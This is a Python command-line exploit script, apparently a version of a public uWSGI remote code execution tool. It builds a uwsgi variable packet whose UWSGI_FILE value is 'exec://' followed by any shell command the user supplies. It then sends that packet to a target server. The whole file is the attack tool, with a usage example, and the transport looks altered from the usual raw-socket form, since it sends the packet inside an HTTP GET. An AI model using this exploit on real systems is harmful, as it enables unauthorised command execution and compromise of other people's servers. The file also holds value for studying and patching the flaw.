#!/usr/bin/python
# coding: utf-8
######################
# Uwsgi RCE Exploit
######################
# Author: wofeiwo@80sec.com
# Created: 2017-7-18
# Last modified: 2018-1-30
# Note: Just for research purpose

import sys
import socket
import argparse
import requests

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s)
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

def fetch_data(uri, var=None, payload=None, body=None):
    if 'http' not in uri:
        uri = 'http://' + uri

    session = requests.Session()
    
    d = session.get(uri, data=pack_uwsgi_vars(var))
    #d = session.get(uri, headers=session.headers)

    
    return {
        'code': d.status_code,
        'text': d.text,
        'header': d.headers
    }


def curl(addr_and_port, payload, uri):

    var = {'UWSGI_FILE': payload, 'SCRIPT_NAME': uri}

    return fetch_data(addr_and_port+uri, var, payload)


def main(*args):
    desc = """
    This is a uwsgi client & RCE exploit.
    Last modifid at 2018-01-30 by wofeiwo@80sec.com
    """
    elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""
    
    parser = argparse.ArgumentParser(description=desc, epilog=elog)

    parser.add_argument('-u', '--uwsgi', nargs='?', required=True,
                        help='Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock',
                        dest='uwsgi_addr')

    parser.add_argument('-c', '--command', nargs='?', required=True,
                        help='Command: The exploit command you want to execute, must have this.',
                        dest='command')

    if len(sys.argv) < 2:
        parser.print_help()
        return

    args = parser.parse_args()

    payload = 'exec://' + args.command + '; echo ""' # must have someting in output or the uWSGI crashs.

    print("[*]Sending payload.")

    print(curl(args.uwsgi_addr, payload, '/penetrate'))

if __name__ == '__main__':
    main()
